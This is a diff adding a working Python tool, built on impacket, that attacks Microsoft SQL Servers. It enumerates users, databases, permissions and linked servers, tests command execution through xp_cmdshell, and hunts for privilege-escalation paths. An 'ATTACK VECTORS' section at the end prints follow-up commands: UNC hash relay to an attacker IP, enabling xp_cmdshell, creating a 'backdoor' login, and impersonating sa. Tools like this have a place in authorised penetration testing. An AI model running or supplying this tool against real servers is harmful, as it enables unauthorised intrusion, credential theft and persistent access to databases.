@@ -1,0 +1,434 @@
+#!/usr/bin/env python3
+"""
+MSSQL Initial Enumeration Script - Enhanced Edition
+Automates the tedious stuff so you can focus on what matters.
+"""
+import argparse
+import sys
+import json
+from datetime import datetime
+
+try:
+    from impacket.tds import MSSQL
+except ImportError:
+    print("Need impacket: pip install impacket --break-system-packages")
+    sys.exit(1)
+
+# Colors for output
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+
+
+class MSSQLEnum:
+    def __init__(self, host, user, password, port=1433, windows_auth=False, export_json=False):
+        self.host = host
+        self.user = user
+        self.password = password
+        self.port = port
+        self.windows_auth = windows_auth
+        self.conn = None
+        self.export_json = export_json
+        self.is_admin = False
+        self.results = {
+            "timestamp": datetime.now().isoformat(),
+            "target": f"{host}:{port}",
+            "user": user,
+            "findings": {}
+        }
+
+    def connect(self):
+        """Establish connection to MSSQL server."""
+        try:
+            self.conn = MSSQL(self.host, self.port)
+            self.conn.connect()  # Need to call connect() first
+
+            if self.windows_auth:
+                if '\\' in self.user:
+                    domain, username = self.user.split('\\', 1)
+                else:
+                    domain, username = '', self.user
+                res = self.conn.login(None, username, self.password, domain, None, True)
+            else:
+                res = self.conn.login(None, self.user, self.password, None, None, False)
+
+            if res:
+                print(f"{Colors.GREEN}[+] Connected to {self.host}:{self.port} as {self.user}{Colors.ENDC}")
+                return True
+            else:
+                print(f"{Colors.RED}[-] Login failed{Colors.ENDC}")
+                return False
+        except Exception as e:
+            print(f"[-] Connection failed: {e}")
+            return False
+
+    def query(self, sql):
+        """Execute query and return results."""
+        try:
+            self.conn.sql_query(sql)
+            self.conn.printReplies()
+            return self.conn.rows
+        except Exception as e:
+            print(f"[-] Query failed: {e}")
+            return []
+
+    def get_row_value(self, rows, row_idx=0, col_idx=0):
+        """Helper to safely extract value from various row formats."""
+        if not rows:
+            return None
+
+        # Handle list of rows
+        if isinstance(rows, list):
+            if len(rows) > row_idx:
+                row = rows[row_idx]
+                if isinstance(row, (list, tuple)):
+                    return row[col_idx] if len(row) > col_idx else None
+                elif isinstance(row, dict):
+                    vals = list(row.values())
+                    return vals[col_idx] if len(vals) > col_idx else None
+                else:
+                    return row if row_idx == 0 and col_idx == 0 else None
+        # Handle dict directly
+        elif isinstance(rows, dict):
+            if row_idx in rows:
+                val = rows[row_idx]
+                if isinstance(val, (list, tuple)):
+                    return val[col_idx] if len(val) > col_idx else None
+                elif isinstance(val, dict):
+                    vals = list(val.values())
+                    return vals[col_idx] if len(vals) > col_idx else None
+                else:
+                    return val if col_idx == 0 else None
+            elif col_idx == 0:
+                vals = list(rows.values())
+                return vals[row_idx] if len(vals) > row_idx else None
+
+        return None
+
+    def print_section(self, title):
+        print(f"\n{Colors.BLUE}{'='*60}{Colors.ENDC}")
+        print(f"{Colors.BOLD}{Colors.HEADER} {title}{Colors.ENDC}")
+        print(f"{Colors.BLUE}{'='*60}{Colors.ENDC}")
+
+    def enum_current_user(self):
+        """Who are we?"""
+        self.print_section("CURRENT USER CONTEXT")
+        queries = [
+            ("System User", "SELECT system_user"),
+            ("Current User", "SELECT current_user"),
+            ("User Name", "SELECT user_name()"),
+        ]
+        for label, q in queries:
+            rows = self.query(q)
+            val = self.get_row_value(rows)
+            if val:
+                print(f"[*] {label}: {val}")
+
+    def enum_server_info(self):
+        """Basic server info."""
+        self.print_section("SERVER INFO")
+        queries = [
+            ("Version", "SELECT @@version"),
+            ("Server Name", "SELECT @@servername"),
+            ("Service Name", "SELECT @@servicename"),
+        ]
+        for label, q in queries:
+            rows = self.query(q)
+            val = self.get_row_value(rows)
+            if val:
+                val = str(val)[:100]  # truncate version string
+                print(f"[*] {label}: {val}")
+
+    def enum_databases(self):
+        """List all databases."""
+        self.print_section("DATABASES")
+        rows = self.query("SELECT name FROM sys.databases")
+        if rows:
+            for row in rows:
+                val = self.get_row_value([row])
+                if val:
+                    print(f"  - {val}")
+        return [self.get_row_value([row]) for row in rows if self.get_row_value([row])] if rows else []
+
+    def enum_tables(self, database):
+        """List tables in a database."""
+        print(f"\n[*] Tables in {database}:")
+        rows = self.query(f"SELECT name FROM {database}.sys.tables")
+        if rows:
+            for row in rows:
+                val = self.get_row_value([row])
+                if val:
+                    print(f"    - {val}")
+        else:
+            print("    (none or no access)")
+        return [self.get_row_value([row]) for row in rows if self.get_row_value([row])] if rows else []
+
+    def enum_users(self):
+        """Enumerate SQL logins and users."""
+        self.print_section("SQL LOGINS & USERS")
+        rows = self.query("SELECT name, is_disabled FROM sys.sql_logins")
+        if rows:
+            for row in rows:
+                name = self.get_row_value([row], 0, 0)
+                disabled = self.get_row_value([row], 0, 1)
+                if name:
+                    status = "DISABLED" if disabled else "active"
+                    print(f"  - {name} ({status})")
+
+    def enum_permissions(self):
+        """Check our permissions."""
+        self.print_section("PERMISSIONS")
+        rows = self.query("SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER')")
+        if rows:
+            for row in rows:
+                val = self.get_row_value([row])
+                if val:
+                    print(f"  - {val}")
+
+    def check_xp_cmdshell(self):
+        """Test xp_cmdshell."""
+        self.print_section("XP_CMDSHELL CHECK")
+        try:
+            rows = self.query("EXEC xp_cmdshell 'whoami'")
+            val = self.get_row_value(rows)
+            if val:
+                print(f"[+] xp_cmdshell WORKS: {val}")
+                return True
+            else:
+                print("[-] xp_cmdshell returned empty (disabled or no perms)")
+        except:
+            print("[-] xp_cmdshell not available")
+        return False
+
+    def check_external_scripts(self):
+        """Check if external scripts (R/Python) are enabled."""
+        self.print_section("EXTERNAL SCRIPTS CHECK")
+        try:
+            rows = self.query("EXEC sp_configure 'external scripts enabled'")
+            val = self.get_row_value(rows, 0, 3)  # run_value column
+            if val and val == 1:
+                print(f"{Colors.YELLOW}[!] External scripts ENABLED (R/Python code exec possible){Colors.ENDC}")
+                print("    Try: EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system(\"whoami\")'")
+                return True
+            else:
+                print("[-] External scripts disabled")
+        except:
+            print("[-] Cannot check external scripts config")
+        return False
+
+    def check_sysadmin(self):
+        """Check if we're sysadmin."""
+        self.print_section("SYSADMIN CHECK")
+        rows = self.query("SELECT IS_SRVROLEMEMBER('sysadmin')")
+        val = self.get_row_value(rows)
+        if val is not None:
+            is_admin = val == 1
+            print(f"[{'+'if is_admin else '-'}] sysadmin: {is_admin}")
+            return is_admin
+        return False
+
+    def enum_linked_servers(self):
+        """Find linked servers for pivoting."""
+        self.print_section("LINKED SERVERS")
+        rows = self.query("EXEC sp_linkedservers")
+        if rows:
+            for row in rows:
+                name = self.get_row_value([row], 0, 0)
+                provider = self.get_row_value([row], 0, 1)
+                if name:
+                    print(f"  - {name} ({provider if provider else 'N/A'})")
+            return [self.get_row_value([row]) for row in rows if self.get_row_value([row])]
+        print("  (none found)")
+        return []
+
+    def check_trustworthy_databases(self):
+        """Check for TRUSTWORTHY databases (privesc vector)."""
+        self.print_section("TRUSTWORTHY DATABASES")
+        rows = self.query("SELECT name FROM sys.databases WHERE is_trustworthy_on = 1")
+        if rows:
+            print(f"{Colors.YELLOW}[!] Found TRUSTWORTHY databases (potential privesc):{Colors.ENDC}")
+            for row in rows:
+                val = self.get_row_value([row])
+                if val:
+                    print(f"    - {val}")
+            return True
+        else:
+            print("  [*] No TRUSTWORTHY databases found")
+            return False
+
+    def check_impersonation(self):
+        """Check impersonation privileges."""
+        self.print_section("IMPERSONATION PRIVILEGES")
+        rows = self.query("""
+            SELECT DISTINCT b.name
+            FROM sys.server_permissions a
+            INNER JOIN sys.server_principals b
+            ON a.grantee_principal_id = b.principal_id
+            WHERE a.permission_name = 'IMPERSONATE'
+        """)
+        if rows:
+            print(f"{Colors.YELLOW}[!] Can impersonate:{Colors.ENDC}")
+            for row in rows:
+                val = self.get_row_value([row])
+                if val:
+                    print(f"    - {val}")
+            return True
+        else:
+            print("  [*] No impersonation privileges")
+            return False
+
+    def check_auto_exec_procs(self):
+        """Check for auto-exec stored procedures."""
+        self.print_section("AUTO-EXEC PROCEDURES")
+        rows = self.query("""
+            SELECT name
+            FROM master.sys.procedures
+            WHERE is_auto_executed = 1
+        """)
+        if rows:
+            print(f"{Colors.YELLOW}[!] Found auto-exec procedures:{Colors.ENDC}")
+            for row in rows:
+                val = self.get_row_value([row])
+                if val:
+                    print(f"    - {val}")
+            return True
+        else:
+            print("  [*] No auto-exec procedures found")
+            return False
+
+    def enum_table_columns(self, database, table):
+        """Enumerate columns for a specific table."""
+        rows = self.query(f"""
+            SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH
+            FROM {database}.INFORMATION_SCHEMA.COLUMNS
+            WHERE TABLE_NAME = '{table}'
+            ORDER BY ORDINAL_POSITION
+        """)
+        if rows:
+            columns = []
+            for row in rows:
+                col_name = self.get_row_value([row], 0, 0)
+                col_type = self.get_row_value([row], 0, 1)
+                col_len = self.get_row_value([row], 0, 2)
+                if col_name:
+                    if col_len:
+                        columns.append(f"{col_name} ({col_type}:{col_len})")
+                    else:
+                        columns.append(f"{col_name} ({col_type})")
+            return columns
+        return []
+
+    def sample_table_data(self, database, table, limit=5):
+        """Sample a few rows from a table."""
+        try:
+            rows = self.query(f"SELECT TOP {limit} * FROM {database}.dbo.{table}")
+            return rows
+        except:
+            return None
+
+    def enum_linked_server_context(self, server):
+        """Check user context on linked server."""
+        print(f"\n[*] Checking context on {server}:")
+        try:
+            # Escape quotes for nested query
+            rows = self.query(f'SELECT * FROM OPENQUERY("{server}", \'SELECT system_user\')')
+            if rows:
+                print(f"    User: {rows[0][0]}")
+        except Exception as e:
+            print(f"    Failed: {e}")
+
+    def export_results(self):
+        """Export results to JSON file."""
+        filename = f"mssql_enum_{self.host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        with open(filename, 'w') as f:
+            json.dump(self.results, f, indent=2, default=str)
+        print(f"\n{Colors.GREEN}[+] Results exported to: {filename}{Colors.ENDC}")
+
+    def run_full_enum(self):
+        """Run the full enumeration."""
+        if not self.connect():
+            return
+
+        # Basic enumeration
+        self.enum_current_user()
+        self.enum_server_info()
+        self.is_admin = self.check_sysadmin()
+        self.enum_permissions()
+
+        # Privilege escalation checks
+        self.check_trustworthy_databases()
+        self.check_impersonation()
+        self.check_auto_exec_procs()
+
+        # Database enumeration with deep dive
+        databases = self.enum_databases()
+        for db in databases:
+            if db not in ['master', 'tempdb', 'model', 'msdb']:  # skip system dbs
+                tables = self.enum_tables(db)
+                # Sample interesting tables
+                if tables:
+                    for table in tables[:2]:  # First 2 tables
+                        print(f"\n  {Colors.BOLD}Columns in {db}.{table}:{Colors.ENDC}")
+                        cols = self.enum_table_columns(db, table)
+                        for col in cols[:10]:  # First 10 columns
+                            print(f"    - {col}")
+
+        self.enum_users()
+        self.check_xp_cmdshell()
+        self.check_external_scripts()
+
+        linked = self.enum_linked_servers()
+        for server in linked:
+            self.enum_linked_server_context(server)
+
+        self.print_section("ATTACK VECTORS")
+        print(f"{Colors.YELLOW}Recommended next steps:{Colors.ENDC}")
+        print("  - xp_dirtree relay: EXEC xp_dirtree '\\\\<YOUR-IP>\\share'")
+        if self.is_admin:
+            print(f"{Colors.GREEN}  - Enable xp_cmdshell: sp_configure 'xp_cmdshell', 1; RECONFIGURE;{Colors.ENDC}")
+            print(f"{Colors.GREEN}  - Add backdoor: sp_addlogin 'backdoor', 'P@ssw0rd123'{Colors.ENDC}")
+        else:
+            print("  - UNC injection: EXEC xp_fileexist '\\\\<YOUR-IP>\\test'")
+            print("  - Try TRUSTWORTHY database privesc if available")
+            print("  - Test impersonation: EXECUTE AS LOGIN = 'sa'")
+        print("  - Query linked servers: SELECT * FROM OPENQUERY(\"SERVER\", 'query')")
+
+        # Export results if requested
+        if self.export_json:
+            self.export_results()
+
+
+def main():
+    parser = argparse.ArgumentParser(description='MSSQL Initial Enumeration - Enhanced Edition')
+    parser.add_argument('host', help='Target host')
+    parser.add_argument('user', help='Username')
+    parser.add_argument('password', help='Password')
+    parser.add_argument('-p', '--port', type=int, default=1433, help='Port (default: 1433)')
+    parser.add_argument('-w', '--windows-auth', action='store_true', help='Use Windows authentication')
+    parser.add_argument('-j', '--json', action='store_true', help='Export results to JSON')
+    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
+
+    args = parser.parse_args()
+
+    # Disable colors if requested
+    if args.no_color:
+        Colors.HEADER = Colors.BLUE = Colors.GREEN = Colors.YELLOW = Colors.RED = Colors.ENDC = Colors.BOLD = ''
+
+    enum = MSSQLEnum(
+        host=args.host,
+        user=args.user,
+        password=args.password,
+        port=args.port,
+        windows_auth=args.windows_auth,
+        export_json=args.json
+    )
+    enum.run_full_enum()
+
+
+if __name__ == "__main__":
+    main()
